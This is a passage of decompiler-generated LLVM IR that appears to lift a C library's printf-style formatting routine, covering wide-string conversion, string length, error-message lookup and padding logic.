  %v2_804aa31 = add i32 %v0_804a87c.lcssa, -8
  %v3_804aa31 = inttoptr i32 %v2_804aa31 to i32*
  store i32 %v0_804aa31, i32* %v3_804aa31, align 4
  %v1_804aa32 = add i32 %v0_804a87c.lcssa, -12
  %v2_804aa32 = inttoptr i32 %v1_804aa32 to i32*
  store i32 134522610, i32* %v2_804aa32, align 4
  %v1_804aa37 = add i32 %v0_804a87c.lcssa, 20
  store i32 %v1_804aa37, i32* %eax.global-to-local, align 4
  %v2_804aa3b = add i32 %v0_804a87c.lcssa, -16
  %v3_804aa3b = inttoptr i32 %v2_804aa3b to i32*
  store i32 %v1_804aa37, i32* %v3_804aa3b, align 4
  %v1_804aa3c = add i32 %v0_804a87c.lcssa, -28
  %v10_804aa3c = icmp slt i32 %v1_804aa3c, 0
  store i1 %v10_804aa3c, i1* %sf.global-to-local, align 1
  %v1_804aa3f = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804aa3f = inttoptr i32 %v1_804aa3c to x86_fp80*
  store x86_fp80 %v1_804aa3f, x86_fp80* %v3_804aa3f, align 4
  %v1_804aa42 = add i32 %v0_804a87c.lcssa, 368
  %v2_804aa42 = inttoptr i32 %v1_804aa42 to i32*
  %v3_804aa42 = load i32, i32* %v2_804aa42, align 4
  %v5_804aa42 = add i32 %v0_804a87c.lcssa, -32
  %v6_804aa42 = inttoptr i32 %v5_804aa42 to i32*
  store i32 %v3_804aa42, i32* %v6_804aa42, align 4
  %v0_804aa49 = call i32 @_fpmaxtostr()
  store i32 %v0_804aa49, i32* %eax.global-to-local, align 4
  %v0_804aa4e = load i32, i32* @esp, align 4
  %v1_804aa4e = add i32 %v0_804aa4e, 32
  %v2_804aa51 = icmp slt i32 %v0_804aa49, 0
  store i1 %v2_804aa51, i1* %sf.global-to-local, align 1
  br i1 %v2_804aa51, label %dec_label_pc_804acff, label %dec_label_pc_804aa59

dec_label_pc_804aa59:                             ; preds = %dec_label_pc_804aa30
  %v1_804aa59 = inttoptr i32 %v1_804aa4e to i32*
  %v2_804aa59 = load i32, i32* %v1_804aa59, align 4
  %v4_804aa59 = add i32 %v2_804aa59, %v0_804aa49
  %v15_804aa59 = icmp slt i32 %v4_804aa59, 0
  store i1 %v15_804aa59, i1* %sf.global-to-local, align 1
  store i32 %v4_804aa59, i32* %v1_804aa59, align 4
  %v0_804acec.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804acec

dec_label_pc_804aa61:                             ; preds = %dec_label_pc_804aa17
  %v1_804aa61 = add i32 %v3_804a87c, -17
  %v5_804aa61 = icmp ult i32 %v3_804a87c, 17
  %v9_804aa61 = icmp eq i32 %v1_804aa61, 0
  %v10_804aa61 = icmp slt i32 %v1_804aa61, 0
  store i1 %v10_804aa61, i1* %sf.global-to-local, align 1
  %v2_804aa64 = or i1 %v5_804aa61, %v9_804aa61
  br i1 %v2_804aa64, label %dec_label_pc_804aa6a, label %dec_label_pc_804aafe

dec_label_pc_804aa6a:                             ; preds = %dec_label_pc_804aa61
  %v1_804aa6a = add i32 %v0_804a87c.lcssa, 332
  %v2_804aa6a = inttoptr i32 %v1_804aa6a to i32*
  store i32 0, i32* %v2_804aa6a, align 4
  %v0_804aa75 = load i32, i32* @esp, align 4
  %v1_804aa75 = add i32 %v0_804aa75, 344
  %v2_804aa75 = inttoptr i32 %v1_804aa75 to i32*
  %v3_804aa75 = load i32, i32* %v2_804aa75, align 4
  store i32 %v3_804aa75, i32* %edx.global-to-local, align 4
  %v1_804aa7c = icmp eq i1 %v9_804aa61, false
  br i1 %v1_804aa7c, label %dec_label_pc_804aace, label %dec_label_pc_804aa7e

dec_label_pc_804aa7e:                             ; preds = %dec_label_pc_804aa6a
  %v1_804aa7e = inttoptr i32 %v3_804aa75 to i32*
  %v2_804aa7e = load i32, i32* %v1_804aa7e, align 4
  store i32 %v2_804aa7e, i32* %eax.global-to-local, align 4
  %v1_804aa80 = icmp eq i32 %v2_804aa7e, 0
  %v2_804aa80 = icmp slt i32 %v2_804aa7e, 0
  store i1 %v2_804aa80, i1* %sf.global-to-local, align 1
  %v2_804aa82 = add i32 %v0_804aa75, 340
  %v3_804aa82 = inttoptr i32 %v2_804aa82 to i32*
  store i32 %v2_804aa7e, i32* %v3_804aa82, align 4
  br i1 %v1_804aa80, label %dec_label_pc_804ab89, label %dec_label_pc_804aa8f

dec_label_pc_804aa8f:                             ; preds = %dec_label_pc_804aa7e
  %v0_804aa8f = load i32, i32* @esp, align 4
  %v1_804aa8f = add i32 %v0_804aa8f, 20
  %v2_804aa8f = inttoptr i32 %v1_804aa8f to i32*
  %v3_804aa8f = load i32, i32* %v2_804aa8f, align 4
  %v1_804aa96 = add i32 %v0_804aa8f, 340
  store i32 %v1_804aa96, i32* %ecx.global-to-local, align 4
  %v2_804aa9d = icmp slt i32 %v3_804aa8f, 0
  store i1 %v2_804aa9d, i1* %sf.global-to-local, align 1
  %v1_804aa9f = icmp eq i1 %v2_804aa9d, false
  %v4_804aa9f = select i1 %v1_804aa9f, i32 %v3_804aa8f, i32 -1
  store i32 %v4_804aa9f, i32* %edx.global-to-local, align 4
  %v1_804aaa2 = add i32 %v0_804aa8f, 332
  store i32 %v1_804aaa2, i32* %eax.global-to-local, align 4
  %v2_804aaa9 = add i32 %v0_804aa8f, -4
  %v3_804aaa9 = inttoptr i32 %v2_804aaa9 to i32*
  store i32 %v1_804aaa2, i32* %v3_804aaa9, align 4
  %v0_804aaaa = load i32, i32* %edx.global-to-local, align 4
  %v2_804aaaa = add i32 %v0_804aa8f, -8
  %v3_804aaaa = inttoptr i32 %v2_804aaaa to i32*
  store i32 %v0_804aaaa, i32* %v3_804aaaa, align 4
  %v0_804aaab = load i32, i32* %ecx.global-to-local, align 4
  %v2_804aaab = add i32 %v0_804aa8f, -12
  %v3_804aaab = inttoptr i32 %v2_804aaab to i32*
  store i32 %v0_804aaab, i32* %v3_804aaab, align 4
  %v0_804aaac = load i32, i32* %ecx.global-to-local, align 4
  %v2_804aaac = add i32 %v0_804aa8f, -16
  %v3_804aaac = inttoptr i32 %v2_804aaac to i32*
  store i32 %v0_804aaac, i32* %v3_804aaac, align 4
  %v0_804aaad = call i32 @__GI_wcsrtombs()
  store i32 %v0_804aaad, i32* %eax.global-to-local, align 4
  %v0_804aab2 = load i32, i32* @esp, align 4
  %v1_804aab2 = add i32 %v0_804aab2, 16
  %v1_804aab5 = add i32 %v0_804aaad, 1
  %v10_804aab5 = icmp eq i32 %v1_804aab5, 0
  %v11_804aab5 = icmp slt i32 %v1_804aab5, 0
  store i1 %v11_804aab5, i1* %sf.global-to-local, align 1
  store i32 %v0_804aaad, i32* @esi, align 4
  br i1 %v10_804aab5, label %dec_label_pc_804acff, label %dec_label_pc_804aac0

dec_label_pc_804aac0:                             ; preds = %dec_label_pc_804aa8f
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804ab9a

dec_label_pc_804aace:                             ; preds = %dec_label_pc_804aa6a
  %v0_804aace = load i32, i32* @ebx, align 4
  %v2_804aace = add i32 %v0_804aa75, -4
  %v3_804aace = inttoptr i32 %v2_804aace to i32*
  store i32 %v0_804aace, i32* %v3_804aace, align 4
  %v1_804aacf = add i32 %v0_804aa75, 332
  store i32 %v1_804aacf, i32* %eax.global-to-local, align 4
  %v2_804aad6 = add i32 %v0_804aa75, -8
  %v3_804aad6 = inttoptr i32 %v2_804aad6 to i32*
  store i32 %v1_804aacf, i32* %v3_804aad6, align 4
  %v0_804aad7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804aad7 = inttoptr i32 %v0_804aad7 to i32*
  %v2_804aad7 = load i32, i32* %v1_804aad7, align 4
  %v4_804aad7 = add i32 %v0_804aa75, -12
  %v5_804aad7 = inttoptr i32 %v4_804aad7 to i32*
  store i32 %v2_804aad7, i32* %v5_804aad7, align 4
  %v1_804aad9 = add i32 %v0_804aa75, 204
  store i32 %v1_804aad9, i32* @edi, align 4
  %v2_804aae0 = add i32 %v0_804aa75, -16
  %v3_804aae0 = inttoptr i32 %v2_804aae0 to i32*
  store i32 %v1_804aad9, i32* %v3_804aae0, align 4
  %v0_804aae1 = call i32 @__GI_wcrtomb()
  store i32 %v0_804aae1, i32* %eax.global-to-local, align 4
  %v0_804aae6 = load i32, i32* @esp, align 4
  %v1_804aae6 = add i32 %v0_804aae6, 16
  %v1_804aae9 = add i32 %v0_804aae1, 1
  %v10_804aae9 = icmp eq i32 %v1_804aae9, 0
  %v11_804aae9 = icmp slt i32 %v1_804aae9, 0
  store i1 %v11_804aae9, i1* %sf.global-to-local, align 1
  store i32 %v0_804aae1, i32* @esi, align 4
  br i1 %v10_804aae9, label %dec_label_pc_804acff, label %dec_label_pc_804aaf4

dec_label_pc_804aaf4:                             ; preds = %dec_label_pc_804aace
  %v2_804aaf4 = add i32 %v0_804aae1, 220
  %v3_804aaf4 = add i32 %v2_804aaf4, %v0_804aae6
  %v4_804aaf4 = inttoptr i32 %v3_804aaf4 to i8*
  store i8 0, i8* %v4_804aaf4, align 1
  br label %dec_label_pc_804ab2c

dec_label_pc_804aafe:                             ; preds = %dec_label_pc_804aa61
  %v1_804aafe = add i32 %v3_804a87c, -19
  %v5_804aafe = icmp ult i32 %v3_804a87c, 19
  %v9_804aafe = icmp eq i32 %v1_804aafe, 0
  %v10_804aafe = icmp slt i32 %v1_804aafe, 0
  store i1 %v10_804aafe, i1* %sf.global-to-local, align 1
  %v2_804ab01 = or i1 %v5_804aafe, %v9_804aafe
  br i1 %v2_804ab01, label %dec_label_pc_804ab03, label %dec_label_pc_804ab5b

dec_label_pc_804ab03:                             ; preds = %dec_label_pc_804aafe
  %v1_804ab03 = add i32 %v0_804a87c.lcssa, 344
  %v2_804ab03 = inttoptr i32 %v1_804ab03 to i32*
  %v3_804ab03 = load i32, i32* %v2_804ab03, align 4
  store i32 %v3_804ab03, i32* %edx.global-to-local, align 4
  %v1_804ab0a = icmp eq i1 %v9_804aafe, false
  %v1_804ab35 = inttoptr i32 %v3_804ab03 to i32*
  %v2_804ab35 = load i32, i32* %v1_804ab35, align 4
  br i1 %v1_804ab0a, label %dec_label_pc_804ab35, label %dec_label_pc_804ab0c

dec_label_pc_804ab0c:                             ; preds = %dec_label_pc_804ab03
  store i32 %v2_804ab35, i32* @edi, align 4
  %v1_804ab0e = icmp eq i32 %v2_804ab35, 0
  %v2_804ab0e = icmp slt i32 %v2_804ab35, 0
  store i1 %v2_804ab0e, i1* %sf.global-to-local, align 1
  br i1 %v1_804ab0e, label %dec_label_pc_804ab89, label %dec_label_pc_804ab12

dec_label_pc_804ab12:                             ; preds = %dec_label_pc_804ab0c, %dec_label_pc_804ab64
  %v1_804ab19 = phi i32 [ %v0_804a87c.lcssa, %dec_label_pc_804ab0c ], [ %v1_804ab7e, %dec_label_pc_804ab64 ]
  %v1_804ab12 = add i32 %v1_804ab19, 20
  %v2_804ab12 = inttoptr i32 %v1_804ab12 to i32*
  %v3_804ab12 = load i32, i32* %v2_804ab12, align 4
  store i32 %v3_804ab12, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_804ab19 = add i32 %v1_804ab19, -4
  %v3_804ab19 = inttoptr i32 %v2_804ab19 to i32*
  store i32 %v3_804a87c, i32* %v3_804ab19, align 4
  %v2_804ab1a = add i32 %v1_804ab19, -8
  %v3_804ab1a = inttoptr i32 %v2_804ab1a to i32*
  store i32 %v3_804a87c, i32* %v3_804ab1a, align 4
  %v2_804ab1b = icmp slt i32 %v3_804ab12, 0
  store i1 %v2_804ab1b, i1* %sf.global-to-local, align 1
  %v1_804ab1d = icmp eq i1 %v2_804ab1b, false
  %v2_804ab1d = load i32, i32* %eax.global-to-local, align 4
  %v4_804ab1d = select i1 %v1_804ab1d, i32 %v3_804ab12, i32 %v2_804ab1d
  store i32 %v4_804ab1d, i32* %eax.global-to-local, align 4
  %v2_804ab20 = add i32 %v1_804ab19, -12
  %v3_804ab20 = inttoptr i32 %v2_804ab20 to i32*
  store i32 %v4_804ab1d, i32* %v3_804ab20, align 4
  %v0_804ab21 = load i32, i32* @edi, align 4
  %v2_804ab21 = add i32 %v1_804ab19, -16
  %v3_804ab21 = inttoptr i32 %v2_804ab21 to i32*
  store i32 %v0_804ab21, i32* %v3_804ab21, align 4
  %v0_804ab22 = call i32 @strnlen()
  store i32 %v0_804ab22, i32* %eax.global-to-local, align 4
  %v0_804ab27 = load i32, i32* @esp, align 4
  %v1_804ab27 = add i32 %v0_804ab27, 16
  %v7_804ab27 = icmp slt i32 %v1_804ab27, 0
  store i1 %v7_804ab27, i1* %sf.global-to-local, align 1
  store i32 %v0_804ab22, i32* @esi, align 4
  br label %dec_label_pc_804ab2c

dec_label_pc_804ab2c:                             ; preds = %dec_label_pc_804aaf4, %dec_label_pc_804ab12
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804ab9a

dec_label_pc_804ab35:                             ; preds = %dec_label_pc_804ab03
  store i32 %v2_804ab35, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_804ab43 = add i32 %v0_804a87c.lcssa, 204
  store i32 %v1_804ab43, i32* @edi, align 4
  %v1_804ab4a = add i32 %v0_804a87c.lcssa, 205
  %v2_804ab4a = inttoptr i32 %v1_804ab4a to i8*
  store i8 0, i8* %v2_804ab4a, align 1
  %v0_804ab52 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab52 = trunc i32 %v0_804ab52 to i8
  %v2_804ab52 = load i32, i32* @esp, align 4
  %v3_804ab52 = add i32 %v2_804ab52, 204
  %v4_804ab52 = inttoptr i32 %v3_804ab52 to i8*
  store i8 %v1_804ab52, i8* %v4_804ab52, align 1
  br label %dec_label_pc_804ab9a

dec_label_pc_804ab5b:                             ; preds = %dec_label_pc_804aafe
  %v1_804ab5b = add i32 %v3_804a87c, -20
  %v9_804ab5b = icmp eq i32 %v1_804ab5b, 0
  %v10_804ab5b = icmp slt i32 %v1_804ab5b, 0
  store i1 %v10_804ab5b, i1* %sf.global-to-local, align 1
  %v1_804ab5e = icmp eq i1 %v9_804ab5b, false
  br i1 %v1_804ab5e, label %dec_label_pc_804acff, label %dec_label_pc_804ab64

dec_label_pc_804ab64:                             ; preds = %dec_label_pc_804ab5b
  %v0_804ab64 = load i32, i32* %stack_var_-364, align 4
  %v1_804ab64 = call i32 @__errno_location(i32 %v0_804ab64)
  store i32 %v1_804ab64, i32* %eax.global-to-local, align 4
  %v0_804ab69 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ab69 = load i32, i32* @esp, align 4
  %v2_804ab69 = add i32 %v1_804ab69, -4
  %v3_804ab69 = inttoptr i32 %v2_804ab69 to i32*
  store i32 %v0_804ab69, i32* %v3_804ab69, align 4
  %v1_804ab6a = add i32 %v1_804ab69, -8
  %v2_804ab6a = inttoptr i32 %v1_804ab6a to i32*
  store i32 128, i32* %v2_804ab6a, align 4
  %v1_804ab6f = add i32 %v1_804ab69, 204
  store i32 %v1_804ab6f, i32* %edx.global-to-local, align 4
  %v2_804ab76 = add i32 %v1_804ab69, -12
  %v3_804ab76 = inttoptr i32 %v2_804ab76 to i32*
  store i32 %v1_804ab6f, i32* %v3_804ab76, align 4
  %v1_804ab77 = inttoptr i32 %v1_804ab64 to i32*
  %v2_804ab77 = load i32, i32* %v1_804ab77, align 4
  %v4_804ab77 = add i32 %v1_804ab69, -16
  %v5_804ab77 = inttoptr i32 %v4_804ab77 to i32*
  store i32 %v2_804ab77, i32* %v5_804ab77, align 4
  %v0_804ab79 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804ab79, i32* %eax.global-to-local, align 4
  %v0_804ab7e = load i32, i32* @esp, align 4
  %v1_804ab7e = add i32 %v0_804ab7e, 16
  %v7_804ab7e = icmp slt i32 %v1_804ab7e, 0
  store i1 %v7_804ab7e, i1* %sf.global-to-local, align 1
  store i32 %v0_804ab79, i32* @edi, align 4
  br label %dec_label_pc_804ab12

dec_label_pc_804ab85:                             ; preds = %dec_label_pc_804aa06, %dec_label_pc_804a9ff, %dec_label_pc_804a9ec
  %v0_804aba234 = phi i32 [ %v1_804a995, %dec_label_pc_804aa06 ], [ 0, %dec_label_pc_804a9ff ], [ 5, %dec_label_pc_804a9ec ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804ab9f

dec_label_pc_804ab89:                             ; preds = %dec_label_pc_804ab0c, %dec_label_pc_804aa7e
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80517de.321 to i32), i32* @edi, align 4
  br label %dec_label_pc_804ab9a

dec_label_pc_804ab9a:                             ; preds = %dec_label_pc_804ab35, %dec_label_pc_804ab2c, %dec_label_pc_804aac0, %dec_label_pc_804ab89
  %v0_804ab9a = load i32, i32* @esp, align 4
  %v1_804ab9a = add i32 %v0_804ab9a, 7
  %v2_804ab9a = inttoptr i32 %v1_804ab9a to i8*
  store i8 32, i8* %v2_804ab9a, align 1
  %v0_804aba2.pre = load i32, i32* @esi, align 4
  %v1_804aba2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ab9f

dec_label_pc_804ab9f:                             ; preds = %dec_label_pc_804ab85, %dec_label_pc_804aa0e, %dec_label_pc_804ab9a
  %v1_804aba2 = phi i32 [ 0, %dec_label_pc_804ab85 ], [ %v2_804aa06, %dec_label_pc_804aa0e ], [ %v1_804aba2.pre, %dec_label_pc_804ab9a ]
  %v0_804aba2 = phi i32 [ %v0_804aba234, %dec_label_pc_804ab85 ], [ %v1_804a995, %dec_label_pc_804aa0e ], [ %v0_804aba2.pre, %dec_label_pc_804ab9a ]
  %v0_804ab9f = load i32, i32* @ebp, align 4
  %v1_804ab9f = add i32 %v0_804ab9f, -11
  %v9_804ab9f = icmp eq i32 %v1_804ab9f, 0
  %v10_804ab9f = icmp slt i32 %v1_804ab9f, 0
  store i1 %v10_804ab9f, i1* %sf.global-to-local, align 1
  %v2_804aba2 = add i32 %v0_804aba2, %v1_804aba2
  store i32 %v2_804aba2, i32* @edx, align 4
  br i1 %v9_804ab9f, label %dec_label_pc_804abb3, label %dec_label_pc_804aba7

dec_label_pc_804aba7:                             ; preds = %dec_label_pc_804ab9f
  %v1_804aba9 = add i32 %v0_804ab9f, -5
  %v6_804aba9 = sub i32 4, %v0_804ab9f
  %v7_804aba9 = and i32 %v6_804aba9, %v0_804ab9f
  %v8_804aba9 = icmp slt i32 %v7_804aba9, 0
  %v9_804aba9 = icmp eq i32 %v1_804aba9, 0
  %v10_804aba9 = icmp slt i32 %v1_804aba9, 0
  store i1 %v10_804aba9, i1* %sf.global-to-local, align 1
  %v3_804abac = icmp eq i1 %v10_804aba9, %v8_804aba9
  %v4_804abac = icmp eq i1 %v9_804aba9, false
  %v5_804abac = and i1 %v4_804abac, %v3_804abac
  %v6_804abac = zext i1 %v5_804abac to i32
  store i32 %v6_804abac, i32* %eax.global-to-local, align 4
  %v2_804abaf = add i32 %v2_804aba2, 1
  %v3_804abaf = add i32 %v2_804abaf, %v6_804abac
  store i32 %v3_804abaf, i32* @edx, align 4
  br label %dec_label_pc_804abb3

dec_label_pc_804abb3:                             ; preds = %dec_label_pc_804ab9f, %dec_label_pc_804aba7
  %v0_804abb3 = load i32, i32* @esp, align 4
  %v1_804abb3 = add i32 %v0_804abb3, 24
  %v2_804abb3 = inttoptr i32 %v1_804abb3 to i32*
  %v3_804abb3 = load i32, i32* %v2_804abb3, align 4
  store i32 %v3_804abb3, i32* %eax.global-to-local, align 4
  %v1_804abb7 = add i32 %v0_804abb3, 8
  %v2_804abb7 = inttoptr i32 %v1_804abb7 to i32*
  store i32 0, i32* %v2_804abb7, align 4
  %v0_804abbf = load i32, i32* %eax.global-to-local, align 4
  %v1_804abbf = load i32, i32* @edx, align 4
  %v2_804abbf = sub i32 %v0_804abbf, %v1_804abbf
  %v7_804abbf = icmp ult i32 %v0_804abbf, %v1_804abbf
  %v12_804abbf = icmp eq i32 %v2_804abbf, 0
  %v13_804abbf = icmp slt i32 %v2_804abbf, 0
  store i1 %v13_804abbf, i1* %sf.global-to-local, align 1
  %v2_804abc1 = or i1 %v7_804abbf, %v12_804abbf
  br i1 %v2_804abc1, label %dec_label_pc_804abc9, label %dec_label_pc_804abc3

dec_label_pc_804abc3:                             ; preds = %dec_label_pc_804abb3
  store i1 %v13_804abbf, i1* %sf.global-to-local, align 1
  store i32 %v2_804abbf, i32* %eax.global-to-local, align 4
  %v1_804abc5 = load i32, i32* @esp, align 4
  %v2_804abc5 = add i32 %v1_804abc5, 8
  %v3_804abc5 = inttoptr i32 %v2_804abc5 to i32*
  store i32 %v2_804abbf, i32* %v3_804abc5, align 4
  %v0_804abcd.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804abc9

dec_label_pc_804abc9:                             ; preds = %dec_label_pc_804abb3, %dec_label_pc_804abc3
  %v0_804abcd = phi i32 [ %v1_804abbf, %dec_label_pc_804abb3 ], [ %v0_804abcd.pre, %dec_label_pc_804abc3 ]
  %v0_804abc9 = load i32, i32* @esp, align 4
  %v1_804abc9 = add i32 %v0_804abc9, 8
  %v2_804abc9 = inttoptr i32 %v1_804abc9 to i32*
  %v3_804abc9 = load i32, i32* %v2_804abc9, align 4
  store i32 %v3_804abc9, i32* @ecx, align 4
  %v2_804abcd = add i32 %v3_804abc9, %v0_804abcd
  store i32 %v2_804abcd, i32* %eax.global-to-local, align 4
  %v1_804abd0 = inttoptr i32 %v0_804abc9 to i32*
  %v2_804abd0 = load i32, i32* %v1_804abd0, align 4
  %v4_804abd0 = add i32 %v2_804abd0, %v2_804abcd
  %v15_804abd0 = icmp slt i32 %v4_804abd0, 0
  store i1 %v15_804abd0, i1* %sf.global-to-local, align 1
  store i32 %v4_804abd0, i32* %v1_804abd0, align 4
  %v0_804abd3 = load i32, i32* @esp, align 4
  %v1_804abd3 = add i32 %v0_804abd3, 7
  %v2_804abd3 = inttoptr i32 %v1_804abd3 to i8*
  %v3_804abd3 = load i8, i8* %v2_804abd3, align 1
  %v4_804abd3 = add i8 %v3_804abd3, -48
  %v9_804abd3 = icmp eq i8 %v4_804abd3, 0
  %v10_804abd3 = icmp slt i8 %v4_804abd3, 0
  store i1 %v10_804abd3, i1* %sf.global-to-local, align 1
  %v1_804abd8 = icmp eq i1 %v9_804abd3, false
  br i1 %v1_804abd8, label %dec_label_pc_804abe4, label %dec_label_pc_804abda

dec_label_pc_804abda:                             ; preds = %dec_label_pc_804abc9
  %v0_804abda = load i32, i32* @ebx, align 4
  %v1_804abda = load i32, i32* @ecx, align 4
  %v2_804abda = add i32 %v1_804abda, %v0_804abda
  %v13_804abda = icmp slt i32 %v2_804abda, 0
  store i1 %v13_804abda, i1* %sf.global-to-local, align 1
  store i32 %v2_804abda, i32* @ebx, align 4
  %v1_804abdc = add i32 %v0_804abd3, 8
  %v2_804abdc = inttoptr i32 %v1_804abdc to i32*
  store i32 0, i32* %v2_804abdc, align 4
  %v0_804abe4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804abe4

dec_label_pc_804abe4:                             ; preds = %dec_label_pc_804abc9, %dec_label_pc_804abda
  %v0_804abeb = phi i32 [ %v0_804abd3, %dec_label_pc_804abc9 ], [ %v0_804abe4.pre, %dec_label_pc_804abda ]
  %v1_804abe4 = add i32 %v0_804abeb, 32
  %v2_804abe4 = inttoptr i32 %v1_804abe4 to i8*
  %v3_804abe4 = load i8, i8* %v2_804abe4, align 1
  %v4_804abe4 = and i8 %v3_804abe4, 8
  %v5_804abe4 = icmp eq i8 %v4_804abe4, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804abe9 = icmp eq i1 %v5_804abe4, false
  br i1 %v1_804abe9, label %dec_label_pc_804ac12, label %dec_label_pc_804abeb

dec_label_pc_804abeb:                             ; preds = %dec_label_pc_804abe4
  %v1_804abeb = add i32 %v0_804abeb, 8
  %v2_804abeb = inttoptr i32 %v1_804abeb to i32*
  %v3_804abeb = load i32, i32* %v2_804abeb, align 4
  store i32 %v3_804abeb, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804abf4 = add i32 %v0_804abeb, 368
  %v2_804abf4 = inttoptr i32 %v1_804abf4 to i32*
  %v3_804abf4 = load i32, i32* %v2_804abf4, align 4
  store i32 %v3_804abf4, i32* @eax, align 4
  %v0_804abfb = call i32 @_charpad()
  store i32 %v0_804abfb, i32* %eax.global-to-local, align 4
  %v1_804ac00 = load i32, i32* @esp, align 4
  %v2_804ac00 = add i32 %v1_804ac00, 8
  %v3_804ac00 = inttoptr i32 %v2_804ac00 to i32*
  %v4_804ac00 = load i32, i32* %v3_804ac00, align 4
  %v5_804ac00 = sub i32 %v0_804abfb, %v4_804ac00
  %v15_804ac00 = icmp eq i32 %v5_804ac00, 0
  %v16_804ac00 = icmp slt i32 %v5_804ac00, 0
  store i1 %v16_804ac00, i1* %sf.global-to-local, align 1
  %v1_804ac04 = icmp eq i1 %v15_804ac00, false
  br i1 %v1_804ac04, label %dec_label_pc_804acff, label %dec_label_pc_804ac0a

dec_label_pc_804ac0a:                             ; preds = %dec_label_pc_804abeb
  store i32 0, i32* %v3_804ac00, align 4
  %v1_804ac12.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ac12

dec_label_pc_804ac12:                             ; preds = %dec_label_pc_804abe4, %dec_label_pc_804ac0a
  %v1_804ac12 = phi i32 [ %v0_804abeb, %dec_label_pc_804abe4 ], [ %v1_804ac12.pre, %dec_label_pc_804ac0a ]
  %v0_804ac12 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ac12 = add i32 %v1_804ac12, -4
  %v3_804ac12 = inttoptr i32 %v2_804ac12 to i32*
  store i32 %v0_804ac12, i32* %v3_804ac12, align 4
  %v0_804ac13 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ac13 = add i32 %v1_804ac12, -8
  %v3_804ac13 = inttoptr i32 %v2_804ac13 to i32*
  store i32 %v0_804ac13, i32* %v3_804ac13, align 4
  %v1_804ac14 = add i32 %v1_804ac12, 368
  %v2_804ac14 = inttoptr i32 %v1_804ac14 to i32*
  %v3_804ac14 = load i32, i32* %v2_804ac14, align 4
  %v5_804ac14 = add i32 %v1_804ac12, -12
  %v6_804ac14 = inttoptr i32 %v5_804ac14 to i32*
  store i32 %v3_804ac14, i32* %v6_804ac14, align 4
  %v0_804ac1b = load i32, i32* @ebp, align 4
  %v1_804ac1b = add i32 %v0_804ac1b, ptrtoint (i32* @global_var_80517e5.322 to i32)
  store i32 %v1_804ac1b, i32* %eax.global-to-local, align 4
  %v2_804ac21 = add i32 %v1_804ac12, -16
  %v3_804ac21 = inttoptr i32 %v2_804ac21 to i32*
  store i32 %v1_804ac1b, i32* %v3_804ac21, align 4
  %v0_804ac22 = load i32, i32* %stack_var_-364, align 4
  %v4_804ac22 = inttoptr i32 %v0_804ac22 to i8*
  %v5_804ac22 = call i32 @__GI_fputs_unlocked(i8* %v4_804ac22, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ac22, i32* %eax.global-to-local, align 4
  %v0_804ac27 = load i32, i32* @esp, align 4
  %v1_804ac27 = add i32 %v0_804ac27, 384
  %v2_804ac27 = inttoptr i32 %v1_804ac27 to i32*
  %v3_804ac27 = load i32, i32* %v2_804ac27, align 4
  store i32 %v3_804ac27, i32* @eax, align 4
  %v0_804ac2e = load i32, i32* @ebx, align 4
  store i32 %v0_804ac2e, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804ac35 = call i32 @_charpad()
  store i32 %v0_804ac35, i32* %eax.global-to-local, align 4
  %v0_804ac3a = load i32, i32* @esp, align 4
  %v1_804ac3a = add i32 %v0_804ac3a, 16
  %v1_804ac3d = load i32, i32* @ebx, align 4
  %v2_804ac3d = sub i32 %v0_804ac35, %v1_804ac3d
  %v12_804ac3d = icmp eq i32 %v2_804ac3d, 0
  %v13_804ac3d = icmp slt i32 %v2_804ac3d, 0
  store i1 %v13_804ac3d, i1* %sf.global-to-local, align 1
  %v1_804ac3f = icmp eq i1 %v12_804ac3d, false
  br i1 %v1_804ac3f, label %dec_label_pc_804acff, label %dec_label_pc_804ac45

dec_label_pc_804ac45:                             ; preds = %dec_label_pc_804ac12
  %v1_804ac45 = add i32 %v0_804ac3a, 356
  %v2_804ac45 = inttoptr i32 %v1_804ac45 to i32*
  %v3_804ac45 = load i32, i32* %v2_804ac45, align 4
  %v4_804ac45 = icmp eq i32 %v3_804ac45, 0
  %v5_804ac45 = icmp slt i32 %v3_804ac45, 0
  store i1 %v5_804ac45, i1* %sf.global-to-local, align 1
  %v1_804ac4d = icmp eq i1 %v4_804ac45, false
  br i1 %v1_804ac4d, label %dec_label_pc_804ac71, label %dec_label_pc_804ac4f

dec_label_pc_804ac4f:                             ; preds = %dec_label_pc_804ac45
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804ac51 = load i32, i32* @esi, align 4
  %v1_804ac51 = icmp eq i32 %v0_804ac51, 0
  %v2_804ac51 = icmp slt i32 %v0_804ac51, 0
  store i1 %v2_804ac51, i1* %sf.global-to-local, align 1
